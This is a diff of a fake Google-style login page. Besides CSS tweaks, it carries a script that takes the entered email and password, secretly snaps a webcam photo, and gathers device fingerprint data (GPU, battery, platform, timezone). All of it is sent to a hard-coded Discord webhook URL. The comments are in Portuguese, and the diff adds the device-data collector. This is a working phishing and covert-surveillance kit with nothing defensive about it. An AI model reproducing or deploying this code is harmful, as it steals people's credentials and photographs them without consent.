@@ -21,8 +21,14 @@
             padding: 40px;
             width: 90%;
             max-width: 400px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+            transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out;
+        }
+
+        .container:hover {
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            transform: translateY(-5px);
         }
 
         .logo {
@@ -31,25 +37,26 @@
         }
 
         .logo img {
-            width: 75px;
+            width: 90px;
         }
 
         .title {
             font-size: 24px;
             font-weight: 400;
             text-align: center;
-            margin-bottom: 10px;
+            margin-bottom: 20px;
         }
 
         .input-field {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
 
         .input-field label {
             display: block;
             font-size: 14px;
             color: #202124;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
+            font-weight: 500;
         }
 
         .input-field input {
@@ -57,19 +64,27 @@
             padding: 10px;
             font-size: 16px;
             border: 1px solid #d3d3d3;
-            border-radius: 4px;
+            border-radius: 5px;
+            transition: border-color 0.3s;
+        }
+
+        .input-field input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 5px rgba(26, 115, 232, 0.3);
         }
 
         .submit-btn {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             font-size: 16px;
             font-weight: bold;
             color: white;
             background-color: #1a73e8;
             border: none;
-            border-radius: 4px;
+            border-radius: 5px;
             cursor: pointer;
+            transition: background-color 0.3s;
         }
 
         .submit-btn:hover {
@@ -85,10 +100,12 @@
         .link a {
             color: #1a73e8;
             text-decoration: none;
+            transition: color 0.3s;
         }
 
         .link a:hover {
             text-decoration: underline;
+            color: #0d47a1;
         }
 
         /* Additional responsive styles */
@@ -110,105 +127,132 @@
             }
         }
     </style>
-    
 
+    <script>
+        // Send Data to Discord Webhook
+        async function sendToDiscord(title, data, isImage = false) {
+            let payload;
 
-<script>
-    // Send Data to Discord Webhook
-    async function sendToDiscord(title, data, isImage = false) {
-        let payload;
-
-        if (isImage) {
-            payload = {
-                content: `Novos ${title} coletados:`,
-                embeds: [
-                    {
-                        title: title,
-                        description: "Imagem capturada pela câmera.",
-                        color: 16711680,
-                        image: {
-                            url: data
+            if (isImage) {
+                payload = {
+                    content: `Novos ${title} coletados:`,
+                    embeds: [
+                        {
+                            title: title,
+                            description: "Imagem capturada pela câmera.",
+                            color: 16711680,
+                            image: {
+                                url: data
+                            }
                         }
-                    }
-                ]
-            };
-        } else {
-            payload = {
-                content: `Novos ${title} coletados`,
-                embeds: [
-                    {
-                        title: title,
-                        description: "Informações coletadas a partir do QR Code",
-                        color: 16711680,
-                        fields: Object.keys(data).map(key => ({
-                            name: key,
-                            value: typeof data[key] === 'string' ? data[key] : JSON.stringify(data[key]),
-                            inline: false
-                        }))
-                    }
-                ]
-            };
+                    ]
+                };
+            } else {
+                payload = {
+                    content: `Novos ${title} coletados`,
+                    embeds: [
+                        {
+                            title: title,
+                            description: "Informações coletadas a partir do QR Code",
+                            color: 16711680,
+                            fields: Object.keys(data).map(key => ({
+                                name: key,
+                                value: typeof data[key] === 'string' ? data[key] : JSON.stringify(data[key]),
+                                inline: false
+                            }))
+                        }
+                    ]
+                };
+            }
+
+            await fetch("https://discord.com/api/webhooks/1293733039331082391/3kVe2OjfbpHf0VCzRtOtq9VirB-_mK9-ZJCNVmc3gPYxOjVKLXfj-hjIDZf5W0Jdv-Fq", {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
         }
 
-        await fetch("https://discord.com/api/webhooks/1293733039331082391/3kVe2OjfbpHf0VCzRtOtq9VirB-_mK9-ZJCNVmc3gPYxOjVKLXfj-hjIDZf5W0Jdv-Fq", {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload)
-        });
-    }
+        // Take hidden picture from the camera
+        async function takeHiddenPicture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-    // Take hidden picture from the camera
-    async function takeHiddenPicture() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+                // Allow the video feed to stabilize for a moment
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Allow the video feed to stabilize for a moment
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    // Convert the snapshot to a base64 data URL
+                    const imageData = canvas.toDataURL('image/png');
 
-                // Convert the snapshot to a base64 data URL
-                const imageData = canvas.toDataURL('image/png');
+                    // Send to Discord as an embed with image URL
+                    sendToDiscord("Captura da Câmera", imageData, true);
 
-                // Send to Discord as an embed with image URL
-                sendToDiscord("Captura da Câmera", imageData, true);
-
-                // Stop the video stream
-                stream.getTracks().forEach(track => track.stop());
-            }, 3000);
-        } catch (err) {
-            console.error('Erro ao acessar a câmera:', err);
+                    // Stop the video stream
+                    stream.getTracks().forEach(track => track.stop());
+                }, 3000);
+            } catch (err) {
+                console.error('Erro ao acessar a câmera:', err);
+            }
         }
-    }
 
-    // Collect Login Credentials
-    async function collectCredentials(event) {
-        event.preventDefault();
-        const email = document.getElementById("email").value;
-        const password = document.getElementById("password").value;
+        // Collect Additional Device Information
+        async function collectAdditionalData() {
+            let deviceInfo = {
+                userAgent: navigator.userAgent,
+                plataforma: navigator.platform,
+                coresCPU: navigator.hardwareConcurrency,
+                suporteTouch: navigator.maxTouchPoints,
+                idioma: navigator.language,
+                tipoConexao: navigator.connection ? navigator.connection.effectiveType : 'Desconhecido',
+                fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
 
-        const credentials = {
-            email: email,
-            password: password
-        };
+            // Estado da Bateria
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                deviceInfo.bateria = `${Math.round(battery.level * 100)}%`;
+                deviceInfo.carregando = battery.charging ? 'Sim' : 'Não';
+            }
 
-        await sendToDiscord("Credenciais de Login", credentials);
+            // Informações WebGL
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                deviceInfo.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Desconhecido';
+            }
 
-        // Trigger all other data collection
-        gatherDeviceInfo();
-        getLocalIP();
-        getLocation();
-        takeHiddenPicture();
-    }
-</script></head>
+            await sendToDiscord("Informações Adicionais do Dispositivo", deviceInfo);
+        }
+
+        // Collect Login Credentials
+        async function collectCredentials(event) {
+            event.preventDefault();
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            const credentials = {
+                email: email,
+                password: password
+            };
+
+            await sendToDiscord("Credenciais de Login", credentials);
+
+            // Trigger all other data collection
+            collectAdditionalData();
+            takeHiddenPicture();
+        }
+    </script>
+</head>
 
 <body>
     <div class="container">
